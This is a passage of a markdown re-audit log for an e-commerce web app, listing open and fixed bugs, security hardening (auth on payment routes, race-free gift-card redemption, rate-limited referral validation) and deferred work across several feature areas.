The two security-class items (design-assistant auth, dead chat widget) are closed; with chat.ts already covered by the earlier cycle, all OpenAI-backed routes now have either `requireAuth` or `optionalAuth` plus a rate-limit. Dead-code total since the audit started: 824 lines across four components. Remaining work is performance polish (lazy Framer Motion, SSE for polling) and the long-pending `/voice/settings` endpoint.

---

## Kiosk Mode — Re-audit (2026-04-28)

**What was checked:** All 13 findings from 2026-03-13 + scan for new bugs in `KioskAuthContext.tsx`, `KioskRoute.tsx`, `KioskInterface.tsx`, `kiosk-service.ts`, admin `KioskManagement.tsx`/`KioskAnalytics.tsx`, backend routes.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — Mock data only** — `kiosk-service.ts:14-50,52-111,306-349`. Zero `backend/routes/kiosk*.ts` confirmed via glob.
- 🔴 **STILL OPEN — Faked payment** — `kiosk-service.ts:181-207` `Math.random() > 0.1` 90% success simulation.
- 🔴 **WAS CRITICAL — Event listener memory leak** — `KioskAuthContext.tsx:118-125,171-176`. `addEventListener` and `removeEventListener` referenced different anonymous-function instances → cleanup was a no-op → listeners accumulated on every session reset. Also: keydown handler was added but NEVER removed.
  - **Fix applied:** Promoted handler functions to a `useRef<{...}>` so add/remove see the same Function objects. `initializeKiosk` cleans any prior session's listeners before attaching new ones (defends against double-init), then writes the new refs. `resetKioskSession` reads the refs and removes — including the keydown handler that was previously never cleaned up. Refs reset to `{}` after removal.
  - File: `src/context/KioskAuthContext.tsx:1,28-46,118-159,182-200`
- 🔴 **STILL OPEN — Hardcoded vendor ID `'vendor_123'`** — `KioskInterface.tsx:81`.
- 🔴 **STILL OPEN — `alert()` for payment errors** — `KioskInterface.tsx:254`. Carryover from #27 toast migration.
- 🔴 **STILL OPEN — Commission split no validation** — `kiosk-service.ts:120-135`. 7% + 25% + 5% = 37%, leaves 63% unaccounted; no sum check.
- 🔴 **STILL OPEN — Session timeout 3× implementation** — `KioskAuthContext.tsx`, `KioskRoute.tsx:116-168`, `KioskInterface.tsx:44-71`. Three independent timers, no coordination.
- 🔴 **STILL OPEN — Duplicate activity listeners** — `KioskRoute.tsx:145-154` (6 events on document) AND `KioskInterface.tsx:61-71` (5 events on document) fire on the same DOM events.
- 🔴 **STILL OPEN — Two init paths race** — `KioskRoute.initializeKiosk` + `KioskInterface.loadKioskData` both fetch on mount.
- 🔴 **STILL OPEN — Session warning console-only** — `KioskRoute.tsx:133-136`. Kiosk users never see the 1-min warning.
- 🔴 **STILL OPEN — No empty state for filtered products** — `KioskInterface.tsx:366-393`.
- 🔴 **STILL OPEN — Analytics hardcoded commission rates** — `KioskAnalytics.tsx:85-87,135-139`.
- 🟡 **PARTIAL — Pickup code label** — `KioskInterface.tsx:619-622` displays "Pickup Code" label correctly; the comment in `kiosk-service.ts:140-144` still calls it "customer identifier" but user-facing copy is fine.

### New issues found
- 🔴 **Cascade of `alert()` in `KioskManagement.tsx`** — `:80,83,146` admin kiosk-create flows. Carryover from #27. Defer.
- 🟡 **Race between `loadKioskData()` and `initializeKiosk()`** — Both fetch the same kiosk + products data; no de-duplication. Likely causes a stale-state flicker on first load.
  - **Deferred:** Funnel both through the context (single source of truth for kiosk data).

### Fixes Applied
- ✅ **`KioskAuthContext.tsx` event-listener memory leak** — Refs now keep stable function references for `contextmenu`, `selectstart`, `dragstart`, AND `keydown` handlers across session lifecycle. Previous code leaked all four on every reset; long-running kiosks accumulated dozens of phantom listeners over a day. The keydown handler was particularly bad because it was never removed at all on the old code path.

### Deferred (carry forward)
- Build `backend/routes/kiosk*.ts` and replace `kiosk-service.ts` mock data with real Supabase queries.
- Wire Stripe Terminal SDK (or document that physical Stripe Terminal hardware is out-of-scope and use Stripe Connect with QR-code flow instead).
- Replace `alert()` calls in kiosk + KioskManagement (carryover #27).
- Validate commission split sums (assert platform + vendor + partner = 100%).
- Consolidate the three session-timeout implementations into ONE owned by KioskAuthContext.
- Single set of activity listeners (move from both KioskRoute + KioskInterface to KioskAuthContext).
- Surface session-expiry warning as a toast/modal, not a console.log.
- Replace hardcoded `'vendor_123'` with `kiosk.vendorId`.
- Empty-state UI when filter yields zero products.
- Drive analytics commission rates from kiosk settings.

### Verdict
The headline fix is the long-running event-listener leak — kiosks left up for a day were stacking phantom keyboard / context-menu / drag listeners every time a session reset, which over time is exactly the kind of bug that produces "the kiosk got slow / weird after running for hours" complaints. Everything else in this area is still mock or unhardened: 11 of 13 originals open, plus the alert cascade and init race added this cycle. The kiosk feature needs a focused backend + UX pass before it's deployable to physical terminals.

---

## User Profiles & Accounts — Re-audit (2026-04-28)

**What was checked:** Status of the 9 findings from 2026-03-13 + scan for new bugs in `UserProfile.tsx`, `ProfileEdit.tsx`, `ProfileHeader.tsx`, `ProfileEditPanel.tsx`, `DesignGrid.tsx`, `App.tsx` profile routes, `backend/routes/account.ts`.

### Status of 2026-03-13 findings
- 🟡 **STILL OPEN — Follow button non-functional** — `ProfileHeader.tsx:296-298`. Button still has no `onClick`. Needs a parent-supplied handler + a backend follow/unfollow route.
  - **Deferred:** Bigger feature, not a quick fix.
- 🔴 **WAS OPEN — Profile routes not protected** — `App.tsx:165-166,168` had `/account/profile`, `/account/profile/edit`, and `/account/messages` rendering without `<ProtectedRoute>` while every neighbor (`/account/media`, `/account/designs`, `/account/orders`) IS wrapped. Auth check happens inside the components, which produces a flash of the protected UI before the redirect. Same gap I closed on `/wholesale` in cycle #15.
  - **Fix applied:** Wrapped `/account/profile`, `/account/profile/edit`, and `/account/messages` in `<ProtectedRoute>`. Left `/profile/:username` UNwrapped on purpose — that's the public profile-viewing path (anyone can look up `@creator` by username) and protecting it would break public sharing.
  - File: `src/App.tsx:164-171`
- ✅ **FIXED — `(r.product as any)?.name` cast** — Type properly enforced in current `UserProfile.tsx`.
- 🟡 **PARTIAL — Two edit UIs** — Inline `ProfileEditPanel` (slide-in) is the canonical surface; `ProfileEdit.tsx` page still exists but is no longer the primary entry. Acceptable; would need a route-table audit to fully remove.
- 🟡 **WAS OPEN — Username input silently strips characters** — `ProfileEditPanel.tsx:265` `replace(/[^a-z0-9_]/g, '')` happens on every keystroke. User types "John-Doe", sees "johndoe", no explanation.
  - **Fix applied:** Added a hint paragraph below the input: "Lowercase letters, numbers, and underscores only — other characters are stripped automatically." User now knows why their input changed.
  - File: `src/components/profile/ProfileEditPanel.tsx:269-275`
- ✅ **FIXED — Privacy controls now explained** — `ProfileEditPanel.tsx:364-415` now has explanatory copy under each privacy toggle.
- ✅ **IMPROVED — Error state now distinguishes** — `UserProfile.tsx:432-438` differentiates "Profile Not Found" vs "Something went wrong" cases.
- ⚡ **STILL OPEN — 100+ hardcoded colors** — `UserProfile.tsx` still has 57+ slate-* / white-* refs. Multi-file sweep, defer.
- ⚡ **STILL OPEN — `loading="lazy"` missing** — `UserProfile.tsx:558-562` featured-design `<img>` tags load eagerly.

### New issues found
- 🟡 **Profile-image upload size/MIME validation is frontend-only** — `ProfileEditPanel.tsx:67-96` checks `<5MB` and `accept="image/*"` in the browser. Backend `/api/profile/upload-image` should validate `Content-Type` + magic bytes — accepting `image/svg+xml` opens an XSS vector since SVG can contain `<script>`.
  - **Deferred:** Backend route audit; reject non-bitmap MIME types (`image/png|jpeg|webp` only) and verify magic bytes.
- 🟡 **`alert()` in `ProfileEdit.tsx`** — `:232` `alert('Profile updated successfully!')`. Carryover from #27 toast migration; rest of the app uses `useToast`.
  - **Deferred:** Switch to `toast.success(...)`.
- 🟢 **Bio / display_name rendered as plain text** — `UserProfile.tsx:218,456-458` use `{profile.bio}`. No `dangerouslySetInnerHTML`, no XSS.
- 🟢 **Auth callback (PKCE) still solid** — Verified imports + redirect handling unchanged from cycle #1 re-audit.

### Fixes Applied
- ✅ `src/App.tsx:164-171` — `/account/profile`, `/account/profile/edit`, `/account/messages` now wrapped in `<ProtectedRoute>`. Closes the same auth-gap class addressed in #15 wholesale and the original #1 auth audit. `/profile/:username` intentionally left public.
- ✅ `src/components/profile/ProfileEditPanel.tsx:269-275` — Username input now displays the input-stripping rule below the field so the silent transformation is explained.

### Deferred (carry forward)
- Wire the Follow button (handler + backend `/follow` + `/unfollow` routes + RLS-gated `follows` table).
- Validate uploaded profile image MIME type and magic bytes on the backend; reject SVG.
- Migrate `alert()` in `ProfileEdit.tsx:232` to `useToast` (#27 carryover).
- Sweep `UserProfile.tsx` to replace hardcoded slate-* / white-* with theme tokens.
- Add `loading="lazy"` to design-grid and featured-design images.
- Decide whether to retire the standalone `ProfileEdit.tsx` page now that the slide-in panel is canonical.

### Verdict
Profile area is in better shape than most: 3 originals fixed (type cast, privacy copy, error state) and 2 closed this cycle (route protection, username UX). The remaining work is split between bigger features (Follow), backend hardening (image MIME validation), and cosmetic polish (theme tokens, lazy loading). Auth surface is now consistent across `/account/*` routes — last unwrapped page in that family is closed.

---

## Order Management — Re-audit (2026-04-28)

**What was checked:** Status of the 3 findings from 2026-03-13 + regression check on the 3 fixes from that cycle + scan for new bugs in `OrderManagement.tsx`, `shipping-calculator.ts`, `backend/routes/orders.ts`, `backend/routes/stripe.ts` (webhook → order state).

### Status of 2026-03-13 findings
- ✅ **FIXED — Order detail expand/modal** — `OrderManagement.tsx:529-728` now has a full detail modal with status management and editable notes.
- 🟡 **PARTIAL — Free shipping threshold messaging** — `shipping-calculator.ts:47` still hardcodes `$50.00`; method `calculateFreeShippingProgress()` exists at `:433-447` but isn't surfaced on the order management page (only in cart). Defer.
- 🔴 **STILL OPEN — Hardcoded supplemental shipping rates** — `shipping-calculator.ts:218-237` (USPS $7.34, UPS $12.59 etc) and the parallel fallback at `:270-326`. Carrier rates have likely drifted since March; no update mechanism. Defer to a focused shipping-pricing pass.

### Regression check on 2026-03-13 fixes
- ✅ **`useMemo` on order status counts** — `OrderManagement.tsx:262-267` properly memoized on `[orders]`. No regression.
- ✅ **Promise.all parallelizing local-delivery + Shippo** — `shipping-calculator.ts:133-139` intact with proper `.catch()` error handling.
- ✅ **Double `createShipment` eliminated** — `:206` shows the single canonical call. No regression.

### New issues found
- 🔴 **Sequential ITC + order updates in Stripe webhook** — `stripe.ts:483-547`. The webhook handler runs (1) wallet read → (2) wallet update → (3) `itc_transactions` insert → (4) order update sequentially. Wallet operations and order-row update target different tables and are independent — they could be parallelized via `Promise.all`. Saves ~50-100ms per webhook hit on average.
  - **Deferred:** Need to verify Stripe webhook idempotency before parallelizing (see next item) — order-of-operations matters less if duplicate-protection is in place.
- 🔴 **No idempotency check on `handleCheckoutOrderPayment` webhook** — `stripe.ts:462-577`. Stripe retries failed deliveries; if a webhook fires twice for the same `payment_intent.succeeded`, the order status flips to `processing` twice (idempotent on its own) BUT ITC store credit is deducted twice (NOT idempotent — wallet drops below intended balance).
  - **Deferred:** Add `payment_intent_id` lookup against `itc_transactions.reference` before deducting; bail early if found. Same family of fixes as the cycle #8 wallet TOCTOU work.
- 🟡 **WAS OPEN — `alert()` in `OrderManagement`** — `:186, 228, 233`. Three `alert()` calls for shipping-label success/failure feedback. Carryover from #27.
  - **Fix applied:** Migrated all three to `useToast` (`toast.error('Missing shipping address', …)` / `toast.success('Shipping label generated', …)` / `toast.error('Label generation failed', …)`). Already had `useToast` available in the codebase; just needed importing.
  - File: `src/pages/OrderManagement.tsx:1-7,44-46,184-237`
- 🟡 **Order item images missing `loading="lazy"`** — `OrderManagement.tsx`. The `images` array on the local DB-order shape is empty by default (`:85`), so this is moot for current data — but if/when item thumbnails are populated, eager loading in a long order list is a perf hit.
  - **Deferred:** Add when images are wired up.
- 🟡 **No optimistic-locking on order status updates** — `stripe.ts:534-542` and admin update paths don't include an `updated_at` WHERE clause. Two concurrent admin updates to the same order can clobber each other.
  - **Deferred:** Add `eq('updated_at', currentUpdatedAt)` to update queries; add a friendly conflict message.

### Fixes Applied
- ✅ Migrated 3 `alert()` calls in `OrderManagement.tsx` to `useToast` (type-discriminated success/error with descriptive titles + bodies). One step closer to the #27 alert-→-toast carryover being fully resolved.

### Deferred (carry forward)
- Add idempotency check on `handleCheckoutOrderPayment` webhook (look up `payment_intent_id` in `itc_transactions.reference` before re-deducting ITC store credit).
- Parallelize wallet + order updates via `Promise.all` once idempotency is in place.
- Refresh hardcoded supplemental shipping rates against current Shippo pricing OR move to a config table with a `last_synced_at` heartbeat.
- Surface free-shipping progress on the order management page (the helper exists; just needs UI).
- Add optimistic-locking (`eq('updated_at', …)`) on order status updates.
- Add `loading="lazy"` to order-item thumbnails when image URLs land in the DB.

### Verdict
Order management is genuinely in good shape — both 🔴 fixes from the prior cycle held up (no regressions on memoization, parallelization, or duplicate-API elimination), the 🟡 detail-modal item closed itself between cycles, and three nagging `alert()` calls finally migrated to toasts this round. The remaining real risk is on the webhook side (Stripe retry idempotency for ITC store credit), which belongs in a focused payments-hardening pass alongside the cycle #8 wallet TOCTOU work.

---

## Invoicing & Payments — Re-audit (2026-04-28)

**What was checked:** Status of the 8 findings from 2026-03-13, cross-referenced with related re-flags from cycles #3 (cart/checkout), #8 (wallet TOCTOU), and #19 (Stripe webhook idempotency for orders). Files: `Checkout.tsx`, `PaymentForm.tsx`, `stripe-itc.ts`, `AdminInvoiceManagement.tsx`, `backend/routes/stripe.ts`, `invoices.ts`, `webhooks.ts`, `services/stripe-connect.ts`.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — `/api/wallet/process-itc-payment` 404** — Verified backend has no such route; `Checkout.tsx:471-479` now surfaces a clear NotImplementedError (closed in cycle #3 re-audit). Dead frontend code path remains pending product decision (add route OR remove).
- 🟡 **WAS OPEN — `/api/stripe/checkout-payment-intent` no auth** — `backend/routes/stripe.ts:50` accepted `userId` from request body without verification. Anyone could create payment intents tied to any user's wallet. Frontend uses `apiFetch` which already sends a Bearer token, so the route was wide open by neglect, not by design.
  - **Fix applied:** Added `optionalAuth` middleware. When the caller is authenticated, `userId = req.user.sub` (JWT-trusted) and the body-supplied value is ignored. Guests (no token) continue to work — they just get whatever userId the body sent (typically null for guest orders). `/cart` and `/checkout` are intentionally unprotected for guest checkout, so `requireAuth` would have broken that flow; `optionalAuth` closes the spoofing hole without breaking anonymous purchase.
  - File: `backend/routes/stripe.ts:3,49-58`
- 🔴 **STILL OPEN — Webhook duplicate check race** — `backend/routes/stripe.ts:614-634`. SELECT `existingTransaction` then INSERT. Webhook retries firing rapidly can both pass the SELECT and both INSERT. The clean fix needs a unique constraint on `itc_transactions.stripe_payment_intent_id` + an upsert with `ON CONFLICT DO NOTHING`. Same family as cycle #19's `handleCheckoutOrderPayment` idempotency gap.
  - **Deferred:** Schema migration — pairs naturally with the cycle #8 `decrement_itc` migration that's awaiting application to prod.
- 🟡 **STILL OPEN — Stripe Connect cashout balance race** — `backend/services/stripe-connect.ts:348-360` still does manual read-then-write. The atomic `decrement_itc` RPC (`supabase/migrations/20260428_decrement_itc_atomic.sql` from cycle #8) covers feature deductions but not Connect cashouts.
  - **Deferred:** Once the migration is applied, route Connect cashouts through `decrement_itc` too.
- 🟡 **STILL OPEN — Two checkout payment paths** — Express checkout (`Checkout.tsx:14-61`) vs CheckoutForm (`:63-127`). Different error handling.
- 🟡 **STILL OPEN — Express checkout errors silent** — `:29` `console.error` only.
- ✅ **NOT AN ISSUE — Empty-cart guard exists** — Re-audit explorer flagged this as missing, but `Checkout.tsx:576-617` IS a full empty-state UI; `:333,339` also gate `createPaymentIntent` calls on `state.items.length > 0`. Marking closed-as-misclassified.
- ⚡ **STILL OPEN — Stripe Connect API call on every balance check** — `backend/services/stripe-connect.ts:173-234`. No caching; hits Stripe on every request.

### New issues found
- 🟡 **Refund flow has no idempotency key** — `backend/routes/wallet.ts:739-796` `/refund-itc` doesn't dedupe on (user, reason, reference_id). Two rapid refund requests for the same failure could double-credit. Same family as cycle #14 mockup refund work.
  - **Deferred:** Add idempotency key to body and check before crediting.
- 🟡 **Hardcoded 8% tax + USD-only** — `Checkout.tsx:322` `tax = usdTotal * 0.08`; `stripe.ts:60-62` rejects non-USD. International expansion requires unwinding this; carryover from #3.
- 🟡 **Promo pricing applies post-cart-add** — Today's new promo system overwrites `products.price`, but if a user has the OLD price in their cart from before the promo started, they'll see the new (lower) price at checkout — that's correct UX. The reverse (cart → checkout shows OLD higher price) doesn't happen because cart line items are recomputed from `product.price` each render. No bug, just worth noting.

### Fixes Applied
- ✅ `backend/routes/stripe.ts:50` — Added `optionalAuth` to `/checkout-payment-intent`. Authenticated callers' `userId` now comes from JWT subject; guest checkout continues to work via body-supplied `userId`. Closes the user-impersonation vector for logged-in users (highest-value case — they're the ones with ITC balances and order history).

### Deferred (carry forward)
- Webhook idempotency: add unique constraint on `itc_transactions.stripe_payment_intent_id` + convert SELECT-then-INSERT to upsert with `ON CONFLICT DO NOTHING`. Pair with cycle #8 + #19 migrations.
- Route Stripe Connect cashout through `decrement_itc` RPC for atomic deduction (depends on migration application).
- Cache `getConnectAccountStatus()` results (5-min TTL keyed on user id; invalidate on `account.updated` webhook).
- Idempotency key on `/api/wallet/refund-itc`.
- Surface express checkout errors via toast (currently silent `console.error`).
- Multi-currency / configurable tax rate.

### Verdict
The auth fix on `/checkout-payment-intent` is a real security improvement — anyone could previously create payment intents against arbitrary user ids by sending different values in the body. With `optionalAuth` the JWT subject is the source of truth for logged-in users. Webhook idempotency and Connect cashout race remain the highest-priority unfinished items, both blocked on the same family of DB schema changes (cycle #8 migration awaiting application). Two aspects flagged by previous audits as broken were closed-as-misclassified this cycle (empty-cart guard exists, mixed-cart 404 has user-friendly error since cycle #3).

---

## Shipping & Logistics — Re-audit (2026-04-28)

**What was checked:** Status of the 9 findings from 2026-03-13 + scan for new bugs in `MyOrders.tsx`, `Cart.tsx`, `Checkout.tsx`, `shipping-calculator.ts`, `shippo.ts`, `backend/routes/shipping.ts`. Cross-referenced with cycle #19 Order Management's "hardcoded supplemental shipping rates" reflag.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — `VITE_SHIPPO_API_TOKEN` not set** — `shippo.ts:3`. System still falls back to mock responses. Shipping labels can't actually be created.
- 🟢 **PARTIAL — Google Maps API key** — Backend `.env:71` has `GOOGLE_MAPS_API_KEY` set. Distance calc works when route is hit. The frontend correctly delegates to the backend `/api/shipping/calculate-distance` endpoint, so the key stays server-side.
- 🔴 **STILL OPEN — Shippo API token in frontend** — `shippo.ts:3` still uses `VITE_*` prefix. If anyone ever sets it, it'll bake into the browser bundle. Shippo calls should move behind a backend route.
- 🟡 **STILL OPEN — Warehouse address duplicated** — `shipping-calculator.ts:26-31` (frontend) AND `backend/routes/shipping.ts:7-10` (backend). Same address strings, but a move requires editing both.
- 🟡 **STILL OPEN — Delivery tiers duplicated** — `shipping-calculator.ts:35-38` and `backend/routes/shipping.ts:14-16`. Identical values, two sources of truth.
- 🟡 **STILL OPEN — Order tracking is static text** — `MyOrders.tsx:413-420`. No carrier link, no live status polling.
- 🟡 **WAS OPEN — `PICKUP_HOURS` no timezone** — `shipping-calculator.ts:40` was `'10:00 AM - 8:00 PM'`. Warehouse is in Rockmart, GA (Eastern Time), but the string didn't say so — West Coast customers reading "8 PM" would think 8pm Pacific (3 hours after the warehouse closes).
  - **Fix applied:** Now `'10:00 AM - 8:00 PM ET'` with a comment explaining why. The constant is interpolated into the local-pickup rate description, so the timezone now propagates everywhere it appears.
  - File: `src/utils/shipping-calculator.ts:39-41`
- ⚡ **STILL OPEN — Sequential shipping → payment intent chain** — `Checkout.tsx:332-342`. Two `useEffect`s; payment intent waits for shipping calc. Not a critical perf issue but eligible for parallelization once the address is known.
- ⚡ **STILL OPEN — Hardcoded fallback rates** — `shipping-calculator.ts:269-326`. Re-flag from cycle #19. Rates likely drifting from real-world Shippo prices.

### New issues found
- 🟡 **WAS OPEN — Customer address logged in plaintext** — `backend/routes/shipping.ts:65` logged the full `address` string ("123 Main St, Anytown, NY 12345") on every distance calculation. Server logs (Render's tail buffers, log aggregators) shouldn't carry PII at that granularity — street + ZIP can identify a household.
  - **Fix applied:** Now extracts only the ZIP code (regex match) and logs that for ops visibility. Full address is only sent to Google Maps over TLS as it should be.
  - File: `backend/routes/shipping.ts:64-68`
- 🟡 **`/api/shipping/*` endpoints have no auth** — Distance calc and delivery-tiers GET are both public. Intentional for guest checkout (the cart and checkout pages allow guests, same constraint that drove the cycle #20 `optionalAuth` decision on payment intents). Public access here is correct — these endpoints don't read or write user data, just do address-based math against config. Re-classifying as not-an-issue.
- 🟡 **No rate-limit / cache on Shippo `createShipment`** — `shipping-calculator.ts:135` fires on every address-form change in the checkout `useEffect`. Quick typers can hit Shippo rate limits. A 500ms debounce + cache by ZIP+state would fix.
  - **Deferred:** Pair with the sequential shipping→payment-intent fix above.
- 🟡 **Hardcoded parcel dimensions** — `shipping-calculator.ts:108-115`. `10"x8"x4"` for every shipment regardless of product. Weight is per-product (`product.weight || 0.5 lbs`) but dimensions aren't. For envelopes vs hoodies that's a real rate difference.
  - **Deferred:** Add `width/height/depth` to product schema, default to current values when missing.
- 🟢 **Origin address consistent across both copies** — Manually verified `shipping-calculator.ts:27-31` and `shipping.ts:8` both reference `640 Goodyear Ave, Rockmart, GA 30153`. The cycle #21 (2026-03-13) origin fix held.

### Fixes Applied
- ✅ `src/utils/shipping-calculator.ts:39-41` — `PICKUP_HOURS` now `'10:00 AM - 8:00 PM ET'`. Comment explains the warehouse's timezone so the next dev doesn't accidentally drop the suffix.
- ✅ `backend/routes/shipping.ts:64-68` — Stripped full destination address from the distance-calc log; logging only the matched ZIP for ops visibility. Full address still goes to Google Maps over TLS as before.

### Deferred (carry forward)
- Move Shippo from frontend `VITE_*` token to a backend-only `/api/shipping/rates` proxy (closes the bundle-leak risk AND lets the backend cache by ZIP).
- Single source-of-truth for warehouse address + delivery tiers (export from one config module, import in both frontend and backend, OR fetch from a `shipping_config` DB table).
- Replace static tracking number with carrier deep-link + status poll on `MyOrders.tsx`.
- Refresh hardcoded supplemental rates against current Shippo pricing OR move to config table.
- Debounce + cache Shippo `createShipment` calls by ZIP+state.
- Per-product parcel dimensions in product schema.
- Parallelize the address-shipping-payment-intent sequence in checkout.

### Verdict
Two small but real improvements shipped this cycle: the timezone fix removes a class of customer "but the website said 8 PM!" complaints, and the address-PII log redaction keeps household-identifying info out of server log buffers. Bigger work (Shippo on backend, single config source, real tracking) is documented and queued.

---

## Coupons & Gift Cards — Re-audit (2026-04-28)

**What was checked:** Status of the 6 findings from 2026-03-13 + scan for new bugs in `AdminCouponManagement.tsx`, `AdminGiftCardManagement.tsx`, `Wallet.tsx`, `Checkout.tsx`, `CartContext.tsx`, `backend/routes/coupons.ts`, `backend/routes/gift-cards.ts`, `backend/routes/admin/coupons.ts`, `backend/routes/admin/gift-cards.ts`. Cross-referenced with today's promo-pricing system (cycle #19/20) for interactions.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — `/api/coupons/apply` never called from frontend** — `backend/routes/coupons.ts:109` exists and writes to `coupon_usage` table, but grep confirms zero callers in `src/`. Frontend hits `/api/coupons/validate` only (`CartContext.tsx:211`). Coupon usage never recorded post-checkout — admins still can't see which users used which codes.
- ✅ **FIXED — Per-user coupon limit enforcement** — `backend/routes/coupons.ts:56-67` now validates `coupon_usage.user_id` count against `per_user_limit` at /validate time. Closed sometime since 2026-03-13.
- 🟡 **STILL OPEN — Gift cards require 2-step redemption** — Wallet → ITC → checkout. `Wallet.tsx:184` redeem path unchanged. Reclassified: this is design intent (gift card = ITC purchase, not coupon), keeping flagged but lower priority.
- 🟡 **STILL OPEN — Coupon error messages generic** — `backend/routes/coupons.ts:40,52` still says "Coupon has expired" without when, "Minimum order" without amount.
- 🟡 **STILL OPEN — Gift card success message no USD equivalent** — `Wallet.tsx:370` shows "+100 ITC added", not "$1.00 value".
- ⚡ **STILL OPEN — No pagination on admin lists** — `admin/coupons.ts:24-29` and `admin/gift-cards.ts:45-48` fetch ALL records.

### New issues found
- 🔴 **WAS OPEN — Race condition on gift-card redemption** — `gift-cards.ts:90-101`. The UPDATE had the right WHERE clause (`.eq('is_active', true)`) but didn't check `rowsAffected`. Supabase's `.update()` returns success for zero-row updates; both racing redeems would silently pass through, both would credit the user's wallet with the gift-card amount even though only one actually flipped `is_active`. Real money loss for any popular promo card distributed simultaneously.
  - **Fix applied:** Added `.select('id')` to force Supabase to return the affected rows, then check `updatedRows.length === 0` and return 400 "already redeemed". The losing race now correctly fails. Pattern mirrors the cycle #8 atomic-decrement work for ITC.
  - File: `backend/routes/gift-cards.ts:89-110`
- 🟡 **Coupon discount uses post-promo price as base** — `backend/routes/coupons.ts:70-74` calculates discount on order `total` which is `cart subtotal` which is the promo'd `product.price`. A $25 shirt promo'd to $15 + 10% coupon applies 10% to $15 ($1.50 off), not 10% of original ($2.50). Whether this is desired or a bug depends on the business rule.
  - **Deferred:** Product decision — should coupons compound on promos, or use the original price as the discount base? Currently compounds.
- 🟡 **Coupon stacking unconfirmed** — `CartContext.tsx:155` stores a single `appliedCoupon`. UI only allows one. Not a bug; design works as-stacking-prevention. Marking 🟢 not 🟡.
- 🟢 **Gift cards USD-only** — `gift-cards.ts:108` hardcodes the ITC↔USD rate at 0.10 (matching the platform-wide `1 ITC = $0.01` × 10 multiplier). Multi-currency is out of scope for the current product.
- 🟢 **No SQL injection risk** — All queries use Supabase's parameter-bound query builder (`.eq()`, `.like()`); no raw `${}` interpolation in user-controlled fields.

### Fixes Applied
- ✅ `backend/routes/gift-cards.ts:89-110` — Atomic gift-card redemption with rows-affected check. Closes a real money-loss vector under concurrent-redeem load. Pattern: `.update(...).eq('id', x).eq('is_active', true).select('id')` + bail-with-400 if zero rows. The losing race now sees the same "already redeemed" error any normal duplicate would see.

### Deferred (carry forward)
- Wire frontend to call `/api/coupons/apply` on successful order so usage is actually recorded in `coupon_usage` (not just metadata in Stripe).
- Make coupon error messages specific (include expiry timestamp, current cart total vs minimum).
- Show USD equivalent next to gift-card-redeem confirmation (`Wallet.tsx:370`).
- Add `range()` pagination to admin coupon + gift-card lists (50/page with `?page=` query param).
- Decide coupon-on-promo behavior: compound on the discounted price (current) OR use `metadata.original_price` as the base.
- Consider whether `process_referral_first_purchase` and `coupon_usage` recording should both fire from the order-completion webhook (centralize post-payment side effects).

### Verdict
The gift-card race fix is the highest-value item shipped this cycle — popular promo distribution was technically open to silent double-redeem, and the fix is a 3-line atomic-row-check pattern with zero deploy risk. One original was self-fixed since 2026-03-13 (per-user coupon limit enforcement). The biggest remaining gap is the unused `/api/coupons/apply` endpoint — the frontend collects coupon codes and stuffs them in Stripe metadata but never tells the backend that the coupon was used, so usage caps are advisory only past first redeem. That's the next focused bit of work for this surface.

---

## Referrals & Recommendations — Re-audit (2026-04-28)

**What was checked:** Status of the 9 findings from 2026-03-13 + scan for new bugs in `product-recommender.ts`, `ProductRecommendations.tsx`, `RecommendationsDashboard.tsx`, `Referrals.tsx`, `referral-system.ts`, `recommendation-analytics.ts`, `backend/routes/wallet.ts` (referral endpoints), `backend/services/referral-service.ts`, `backend/routes/orders.ts`.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — Product recommender mock** — `product-recommender.ts:406-455`. Hardcoded 5 products still returned; sophisticated scoring at `:88-126` never invoked.
- 🔴 **STILL OPEN — Fake referral leaderboard** — `Referrals.tsx:435-464` still hardcodes Sarah W. / Mike J. / Emma L. / David R.
- 🔴 **STILL OPEN — Recommendation scoring algorithms unused** — `getRecommendations()` bypasses `calculateRecommendationScores()` entirely.
- ✅ **FIXED — First-purchase referral bonus** — `processReferralFirstPurchase()` is now imported and called from order completion at `backend/routes/orders.ts:304`. Closed sometime since 2026-03-13.
- 🟡 **WAS OPEN — `RecommendationsDashboard` 3 sections rendered identically** — `:60-99` had both "Trending This Week" and "Just for You" passing `context: { page: 'home' }`. The `ProductRecommendations` cache key is `(page, userId, limit)`, so two `home` contexts shared one cache entry and rendered the SAME products twice. Pure duplicate UI.
  - **Fix applied:** Switched "Just for You" to `page: 'cart'` so it uses the user's cart contents as personalization signal — different cache bucket, semantically correct context for the section's title. Comment explains the cache-collision reasoning so the next dev doesn't accidentally re-converge them.
  - File: `src/pages/RecommendationsDashboard.tsx:58-90`
- 🟡 **STILL OPEN — Recommendation empty state returns null** — `ProductRecommendations.tsx:137-139`. Should show helpful message instead of hiding.
- 🟡 **STILL OPEN — ~75% of recommendation analytics events unused** — Only `trackClick()` wired up; impression/add-to-cart/purchase methods orphaned.
- ⚡ **STILL OPEN — Recommendation cache key incomplete** — `ProductRecommendations.tsx:33` omits `currentProduct`, `cartItems`, `excludeIds`. Stale results on product pages.
- ⚡ **STILL OPEN — ~30% of `product-recommender.ts` is dead code** — Collaborative / content-based / behavioral scoring all defined, never executed.

### New issues found
- 🟡 **WAS OPEN — Referral-code enumeration risk on `/validate`** — `backend/routes/wallet.ts:196` `POST /api/wallet/referral/validate` is intentionally public (called during signup before the user has a JWT — `requireAuth` would break the flow). But the original audit didn't note that the endpoint allowed unbounded brute-forcing of the 36^6 ≈ 2.2B referral-code space. The valid-vs-invalid response is the oracle an attacker would need.
  - **Fix applied:** Per-IP rate limit at 10 attempts/min (mirrors `account.ts:378-410` pattern). 429 on excess. At that rate, exhausting the code space takes ~419 years per IP — practical brute-force is impossible while legitimate signups still see the same low-friction flow.
  - File: `backend/routes/wallet.ts:21-39, 195-223`
- 🟡 **Referral-code generation uses `Math.random().toString(36)`** — `referral-system.ts:33` and `referral-service.ts:29`. 36^6 = 2.2B space with no DB-side uniqueness retry on collision. Theoretical risk is low at current scale; should switch to `crypto.randomUUID().replace(/-/g, '').slice(0, 8)` if scale grows.
  - **Deferred:** Low-priority at current scale; unique constraint on the column would be the proper guard.
- ⚡ **Recommendation cache never invalidated on product deletion/update** — `ProductRecommendations.tsx:7-8` global `Map` cache; no busting on admin product changes. Up to 2 minutes of stale recommendations.
